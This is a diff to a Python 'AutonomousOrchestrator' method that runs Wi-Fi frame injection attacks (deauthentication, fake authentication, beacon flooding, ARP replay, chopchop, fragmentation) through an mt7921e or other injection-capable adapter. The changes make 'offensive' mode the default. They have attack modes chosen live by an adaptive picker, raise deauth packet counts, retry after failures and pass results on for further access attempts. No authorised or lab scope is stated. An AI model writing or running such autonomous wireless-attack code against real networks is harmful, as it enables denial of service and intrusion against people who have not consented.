@@ -3893,25 +3893,59 @@ class AutonomousOrchestrator:
     def _dispatch_mt7921e_inject(self, step: Dict[str, Any],
                                seed: Dict[str, Any],
                                report: Dict[str, Any]) -> None:
-        """Inject a raw 802.11 frame (or a mode-specific burst) via the
-        mt7921e raw-injection path. Args:
+        """Offensive packet inject (poly mode) via mt7921e / aireplay path.
+
+        Args:
           - ``frame_b64``: base64-encoded raw frame → ``inject_raw_frame``.
-          - ``mode``: one of deauth | fakeauth | beacon_flood | arp_replay |
+          - ``mode``: deauth | fakeauth | beacon_flood | arp_replay |
             chopchop | fragmentation | cts_rts → ``mt7921e_tools.inject``.
-          - else (no mode, no frame_b64): deauth default → ``inject_deauth``
-            (back-compat) with ``bssid``/``channel``/``count``.
-        Skipped when no mt7921e cap / no iface."""
+          - ``offensive``: when true (default for new chains), missing mode
+            is chosen live via :func:`core.poly.offensive_inject.pick_inject_mode`.
+          - else (no mode, no frame_b64): deauth default → ``inject_deauth``.
+
+        Runs when ``mt7921e`` **or** ``injection_capable`` and iface present.
+        Records ``seed['last_inject_result']`` for live re-adaptation and
+        PE chaining. Never fabricates success.
+        """
         caps = seed.get("adapter_caps", {}) or {}
-        iface = self._mt7921e_iface(seed)
-        if not iface or not caps.get("mt7921e"):
+        iface = self._mt7921e_iface(seed) or seed.get("interface") or seed.get("iface") or self.interface
+        can = bool(
+            caps.get("mt7921e")
+            or caps.get("injection_capable")
+            or seed.get("injection_capable")
+            or seed.get("mt7921e")
+        )
+        if not iface or not can:
             self._emit(
-                "[-] mt7921e_inject: skipped (no mt7921e adapter / no iface)"
+                "[-] inject: skipped (no injection-capable adapter / no iface)"
             )
             report["skipped"].append(
-                "mt7921e_inject: no mt7921e adapter / no iface"
+                "mt7921e_inject: no injection-capable adapter / no iface"
             )
             return
-        args = step.get("args", {}) or {}
+        args = dict(step.get("args", {}) or {})
+        # Live poly mode when offensive and mode omitted / failed history
+        mode = (args.get("mode") or "").strip().lower()
+        try:
+            if args.get("offensive", True) and (
+                not mode or seed.get("force_poly_inject_mode")
+            ):
+                from core.poly.offensive_inject import pick_inject_mode
+                hist = list(seed.get("inject_mode_history") or [])
+                pick = pick_inject_mode(
+                    seed, seed.get("last_inject_result"), exclude=hist,
+                )
+                mode = (pick.get("mode") or "deauth").strip().lower()
+                args["mode"] = mode
+                if pick.get("station") and not args.get("station"):
+                    args["station"] = pick["station"]
+                self._emit(
+                    f"[poly] offensive inject mode={mode}: {pick.get('rationale')}"
+                )
+        except Exception:  # noqa: BLE001
+            mode = mode or "deauth"
+        if not mode:
+            mode = "deauth"
         try:
             if args.get("frame_b64"):
                 from core.modules.mt7921e_tools import inject_raw_frame
@@ -3921,14 +3955,13 @@ class AutonomousOrchestrator:
                     b64=True,
                 )
             else:
-                mode = (args.get("mode") or "deauth").strip().lower()
                 if mode == "deauth":
                     from core.modules.mt7921e_tools import inject_deauth
                     r = inject_deauth(
                         iface,
                         args.get("bssid") or seed.get("bssid"),
                         channel=args.get("channel") or seed.get("channel"),
-                        count=int(args.get("count", 10)),
+                        count=int(args.get("count", 32 if args.get("offensive") else 10)),
                         station=args.get("station"),
                     )
                 else:
@@ -3939,22 +3972,53 @@ class AutonomousOrchestrator:
                         bssid=args.get("bssid") or seed.get("bssid"),
                         station=args.get("station"),
                         channel=args.get("channel") or seed.get("channel"),
-                        count=int(args.get("count", 10)),
+                        count=int(args.get("count", 16)),
                         interval_ms=args.get("interval_ms"),
                         ssid=args.get("ssid") or seed.get("ssid"),
                     )
+            r = dict(r or {})
+            r.setdefault("mode", mode)
+            r["offensive"] = bool(args.get("offensive", True))
+            ok = bool(r.get("ok"))
             self._emit(
-                f"[+] mt7921e_inject: ok={r.get('ok')} method={r.get('method', mode if 'mode' in locals() else 'raw')}"
+                f"[{'+' if ok else '!'}] offensive inject: ok={ok} "
+                f"mode={mode} method={r.get('method', mode)}"
             )
-            report["executed"].append({
+            entry = {
                 "action": "mt7921e_inject",
-                "ok": r.get("ok"),
+                "ok": ok,
                 "method": r.get("method"),
+                "mode": mode,
                 "result": r,
-            })
+                "desc": f"offensive inject mode={mode}",
+                "kind": "ai",
+            }
+            report["executed"].append(entry)
+            # Live seed memory for next adaptive cycle / PE handoff
+            seed["last_inject_result"] = r
+            hist = list(seed.get("inject_mode_history") or [])
+            if mode and mode not in hist:
+                hist.append(mode)
+            seed["inject_mode_history"] = hist[-8:]
+            if not ok:
+                try:
+                    from core.poly.offensive_inject import react_inject
+                    reaction = react_inject(
+                        seed, r, history_modes=seed.get("inject_mode_history"),
+                    )
+                    seed["inject_live_reaction"] = reaction
+                    self._emit(
+                        reaction.get("narrative")
+                        or f"[poly] inject retry phase={reaction.get('phase')}"
+                    )
+                except Exception:  # noqa: BLE001
+                    pass
+            # Access signals (rare from inject alone) still flow through PE
+            self._record_access(report, entry)
         except Exception as e:  # noqa: BLE001
             self._emit(f"[!] mt7921e_inject failed: {e}")
             report["skipped"].append(f"mt7921e_inject: {e}")
+            seed["last_inject_result"] = {"ok": False, "error": str(e), "mode": mode}
 
     # ------------------------------------------------------------------
     def _dispatch_external_inject(self, step: Dict[str, Any],
